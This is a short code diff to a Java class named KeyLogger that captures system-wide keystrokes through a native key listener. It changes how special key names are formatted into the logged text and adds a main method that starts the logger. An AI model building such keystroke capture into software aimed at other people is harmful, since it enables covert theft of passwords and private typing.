@@ -57,12 +57,12 @@ public class KeyLogger implements NativeKeyListener {
          * ELSE NORMAL APPEND
          */
         if (keyText.length() > 1) {
-            if (IS_FIRST_SPlIT) {
-                temp += String.format(FORMAT, keyText.contains(RIGHT_SHIFT_KEYCODE) ? RIGHT_SHIFT_KEY_TEXT : keyText);
-                IS_FIRST_SPlIT = false;
+            keyText = keyText.contains(RIGHT_SHIFT_KEYCODE) ? RIGHT_SHIFT_KEY_TEXT : keyText;
+            if (temp.endsWith(SPLITTER)) {
+                temp += keyText + SPLITTER;
                 return;
             }
-            temp += keyText.contains(RIGHT_SHIFT_KEYCODE) ? RIGHT_SHIFT_KEY_TEXT : keyText;
+            temp += String.format(FORMAT, keyText);
             return;
         }
         temp += keyText;
@@ -71,5 +71,9 @@ public class KeyLogger implements NativeKeyListener {
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
 
+    }
+
+    public static void main(String[] args) {
+        KeyLogger.start();
     }
 }
